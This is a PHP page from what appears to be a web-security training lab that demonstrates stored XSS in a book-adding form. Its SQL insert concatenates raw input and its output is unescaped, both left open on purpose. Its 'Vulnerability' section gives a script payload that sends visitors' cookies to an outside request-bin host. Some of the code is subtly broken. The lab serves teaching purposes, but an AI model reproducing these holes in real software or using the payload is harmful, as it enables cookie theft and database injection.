<?php 
    require "db_connect.php";
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Safozi Injection">
    <meta name="author" content="mohamed boubaya ">

    <title>Safozi Injection </title>

    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">
  </head>

  <body>

   
    <div class="container">
      <div class="header hidden-xs">
        <ul class="nav nav-pills pull-right">
          <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">SQL-Standard Login<b class="caret"></b></a>
            <ul class="nav dropdown-menu">
              <li><a href="login1.php">Vulnerable</a></li>
              <li><a href="login2.php">Secure</a></li>
            </ul>
          </li>
          <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">SQL-Search<b class="caret"></b></a>
            <ul class="nav dropdown-menu">
               <li><a href="books1.php">Vulnerable</a></li>
              <li><a href="books2.php">Secure</a></li>
            </ul>
          </li>
          <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Xss-Stored<b class="caret"></b></a>
            <ul class="nav dropdown-menu">
              <li><a href="books1.php">Vulnerable</a></li>
              <li><a href="books2.php">Secure</a></li>
            </ul>
          </li>
          <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">LFI-injection<b class="caret"></b></a>
            <ul class="nav dropdown-menu">
             <li><a href="login5.php">Vulnerable</a></li>
              <li><a href="login6.php">Secure</a></li>
            </ul>
          </li>
        </ul>
        <h3 class="text-muted"><a href="index.php">Safozi Injection</a></h3>
      </div>
      <?php include("mobile-navbar.php"); ?>
      
      <h3 class="text-center"><span class="label label-danger">
Vulnerable Xss-Stored </span></h3><br>
      
      <?php
        if ($_GET['attempt'] != 1)
        {
      ?>
      
     <div class="row">
        <div class="col-sm-10">
          <form class="form-inline" role="form" action="login3.php?attempt=1" method="POST">
            <div class="form-group">
              <label class="sr-only" for="exampleInputEmail2">Book title</label>
              <input type="text" name="Name" class="form-control" placeholder="Book title">
            </div>
            <div class="form-group">
              <label class="sr-only" for="exampleInputPassword2">Book author</label>
              <input type="text" name="Author" class="form-control" placeholder="Book author">
            </div>
            <button type="submit" class="btn btn-success">Add </button>
          </form>
        </div>
        <div class="col-sm-2">
          <span class="visible-xs">&nbsp;</span>
          <a href="login3.php?all=1"><button type="button" class="btn btn-info">All books</button></a>
        </div>
      </div>   
           
      
      <?php
        }
        else
        {
            $Name = $_POST['Name'];
            $Author = $_POST['Author'];    
            $query = sprintf("INSERT INTO books (title, author)
VALUES ('".$Name."', '".$Author."')");
           mysqli_query($connection, $query);
        
            if ($result->num_rows > 0)
            {
 
                echo "<p class=\"text-center\">Authenticated as <strong>" .$Name . "</strong></p>";
            
              
            }
            else
            {
              ?>
                <div class="row">
        <div class="col-sm-10">
          <form class="form-inline" role="form" action="login3.php?attempt=1" method="POST">
            <div class="form-group">
              <label class="sr-only" for="exampleInputEmail2">Book title</label>
              <input type="text" name="Name" class="form-control" placeholder="Book title">
            </div>
            <div class="form-group">
              <label class="sr-only" for="exampleInputPassword2">Book author</label>
              <input type="text" name="Author" class="form-control" placeholder="Book author">
            </div>
            <button type="submit" class="btn btn-success">Add </button>
          </form>
        </div>
        <div class="col-sm-2">
          <span class="visible-xs">&nbsp;</span>
          <a href="login3.php?all=1"><button type="button" class="btn btn-info">All books</button></a>
        </div>
      </div>

            
           
      <?php
    }


              
      ?>
      
      <hr>
      <div class="row">
        <div class="col-sm-12">
          <h4>Query Executed:</h4>
        </div>
      </div>
      
      <div class="row">
        <div class="col-sm-12">
          <div class="highlight">
            <pre><?= $query ?></pre>
          </div>
        </div>
      </div>
      
      <?php } ?>
      
      <hr>
     
          <table class="table table-bordered">
        <tr>
          <th>#ID</th>
          <th>Title</th>
          <th>Author</th>
        </tr>
      <?php
        if ($_GET['all'] == 1)
        {
            $query = "SELECT * FROM books;";
        }
     
            
    if ($query != null)
    {
      $result = mysqli_query($connection, $query);

      while (($row = mysqli_fetch_row($result)) != null)
      {
        printf("<tr><td>%s</td><td>%s</td><td>%s</td></tr>", $row[0], $row[1], $row[2]);
      }
    }
      ?>
      </table>
      
      <hr>
    
    <div class="row">
        <div class="col-sm-12">

          <h4>PHP Code:</h4>
        </div>
      </div>
      
      <div class="row">
        <div class="col-sm-12">
          <div class="highlight">
            <pre>


 $Name = $_POST['Name'];
            $Author = $_POST['Author'];    
            $query = sprintf("INSERT INTO books (title, author)
VALUES ('".$Name."', '".$Author."')");
           mysqli_query($connection, $query) ;


            </pre>
          </div>
        </div>
      </div>
      
      <hr>
      <div class="row">
        <div class="col-sm-12">
          <h4>Vulnerability:</h4>
        </div>
      </div>
      
      <div class="row">
        <div class="col-sm-12">
          <div class="highlight">
            <pre >
  Go to http://requestb.in/ and create a request bin for yourself. The bin url will look like http://requestb.in/xxxxxx.

Now let’s push that to the page. Put some Book title, write
<strong>
  &#60scrip&#62document.write('&#60img src=\"http://requestb.in/xxxxxxsteal?cookie='+document.cookie+'\"');&#60/script&#62
</strong> as Book author.
</pre>
          </div>
        </div>
      </div>
      
      <br>

      <?php include("footer.php"); ?>

    </div> <!-- /container -->

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
  </body>
</html>

